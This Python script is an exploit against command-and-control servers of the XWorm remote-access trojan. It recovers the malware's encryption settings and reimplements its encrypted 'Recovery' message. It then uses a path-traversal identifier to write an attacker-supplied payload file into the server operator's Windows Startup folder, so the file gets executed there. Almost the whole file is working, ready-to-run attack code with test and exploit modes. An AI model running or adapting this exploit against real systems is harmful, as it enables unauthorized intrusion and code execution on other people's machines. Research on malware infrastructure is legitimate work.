#!/usr/bin/env python3
"""
XWorm C2 Path Traversal Exploit
"""

import socket
import base64
import hashlib
import time
import argparse
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


class XWormExploit:
    def __init__(self, c2_host, c2_port, key_b64, spl_b64, mutex):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.key = self._decrypt_config(key_b64, mutex)
        self.spl = self._decrypt_config(spl_b64, mutex)
        self.aes_key = hashlib.md5(self.key.encode('utf-8')).digest()
    
    def _decrypt_config(self, encrypted_b64, mutex):
        md5_hash = hashlib.md5(mutex.encode('utf-8')).digest()
        key = bytearray(32)
        key[0:16] = md5_hash
        key[15:31] = md5_hash
        cipher = AES.new(bytes(key), AES.MODE_ECB)
        encrypted = base64.b64decode(encrypted_b64)
        decrypted = cipher.decrypt(encrypted)
        return unpad(decrypted, AES.block_size).decode('utf-8')
    
    def _aes_encrypt(self, data):
        cipher = AES.new(self.aes_key, AES.MODE_ECB)
        return cipher.encrypt(pad(data, AES.block_size))
    
    def _send_message(self, sock, message):
        encrypted = self._aes_encrypt(message.encode('utf-8'))
        length_str = f"{len(encrypted)}\x00".encode('utf-8')
        sock.sendall(length_str)
        sock.sendall(encrypted)
    
    def test_vulnerability(self):
        """Test if path traversal vulnerability exists"""
        test_content = f"XWORM_VULN_TEST_{int(time.time())}"
        traversal_hwid = "..\\..\\VULN_TEST"
        message = f"Recovery{self.spl}{traversal_hwid}{self.spl}0{self.spl}{test_content}"
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_host, self.c2_port))
            self._send_message(sock, message)
            time.sleep(1)
            sock.close()
            print(f"[+] Test payload sent")
            print(f"[*] Verify: Check C2 directory for VULN_TEST\\Recovery\\FileZilla_*.txt")
            return True
        except Exception as e:
            print(f"[-] Test failed: {e}")
            return False
    
    def exploit_startup(self, payload=None):
        """Exploit path traversal to write file via Recovery message"""
        if not payload:
            payload = "XWorm C2 Path Traversal PoC - Test payload"
        
        traversal_hwid = "..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        message = f"Recovery{self.spl}{traversal_hwid}{self.spl}0{self.spl}{payload}"
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_host, self.c2_port))
            self._send_message(sock, message)
            time.sleep(1)
            sock.close()
            
            print(f"[+] Payload sent ({len(payload)} bytes)")
            print(f"[*] File written to: %APPDATA%\\...\\Startup\\Recovery\\FileZilla_<timestamp>.txt")
            return True
        except Exception as e:
            print(f"[-] Exploit failed: {e}")
            return False


def main():
    parser = argparse.ArgumentParser(description="XWorm C2 Path Traversal Exploit")
    parser.add_argument('host', help='C2 server IP/hostname')
    parser.add_argument('port', type=int, help='C2 server port')
    parser.add_argument('--key', required=True, help='AES key (base64, from Settings.KEY)')
    parser.add_argument('--spl', required=True, help='Separator (base64, from Settings.SPL)')
    parser.add_argument('--mutex', required=True, help='Mutex (from Settings.Mutex)')
    parser.add_argument('--test', action='store_true', help='Test vulnerability')
    parser.add_argument('--exploit', action='store_true', help='Exploit to Startup folder')
    parser.add_argument('--payload', help='Custom payload file')
    
    args = parser.parse_args()
    
    if not args.test and not args.exploit:
        parser.error("Must specify --test or --exploit")
    
    print("[*] XWorm C2 Path Traversal Exploit")
    print(f"[*] Target: {args.host}:{args.port}")
    
    exploit = XWormExploit(args.host, args.port, args.key, args.spl, args.mutex)
    
    payload_content = None
    if args.payload:
        try:
            with open(args.payload, 'r') as f:
                payload_content = f.read()
        except Exception as e:
            print(f"[-] Failed to read payload file: {e}")
            sys.exit(1)
    
    if args.test:
        success = exploit.test_vulnerability()
        sys.exit(0 if success else 1)
    
    if args.exploit:
        success = exploit.exploit_startup(payload_content)
        sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
